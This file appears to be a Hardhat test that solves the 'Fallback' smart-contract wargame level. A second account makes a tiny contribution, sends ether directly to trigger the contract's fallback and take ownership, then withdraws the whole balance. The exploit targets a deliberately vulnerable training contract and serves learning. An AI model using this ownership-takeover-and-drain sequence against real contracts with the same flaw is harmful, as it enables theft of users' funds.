import { loadFixture } from '@nomicfoundation/hardhat-network-helpers'
import { expect } from 'chai'
import { BigNumber, Contract } from 'ethers'
import { parseEther } from 'ethers/lib/utils'
import { ethers } from 'hardhat'

describe('Fallback', function () {
  const deployFixture = async () => {
    const [deployer, ...signers] = await ethers.getSigners()
    const FallbackFactory = await ethers.getContractFactory('Fallback')
    const Fallback = await FallbackFactory.connect(deployer).deploy()
    await Fallback.deployed()
    return { Fallback, deployer, signers }
  }

  describe('Solution', function () {
    it('take ownership and reduce balance', async () => {
      const { Fallback, deployer, signers } = await loadFixture(deployFixture)
      expect(await Fallback.owner()).to.equal(deployer.address)
      Fallback.connect(signers[0]).contribute({ value: parseEther("0.0009") })
      expect(await Fallback.connect(signers[0]).getContribution()).to.equal(BigNumber.from(parseEther("0.0009")))
      await signers[0].sendTransaction({ to: Fallback.address, value: parseEther("1") })
      expect(await ethers.provider.getBalance(Fallback.address)).to.equal(BigNumber.from(parseEther("1.0009")))
      // Passes if attack successed
      expect(await Fallback.owner()).to.equal(signers[0].address)
      await Fallback.connect(signers[0]).withdraw()
      expect(await ethers.provider.getBalance(Fallback.address)).to.equal(0)
    })
  })
})
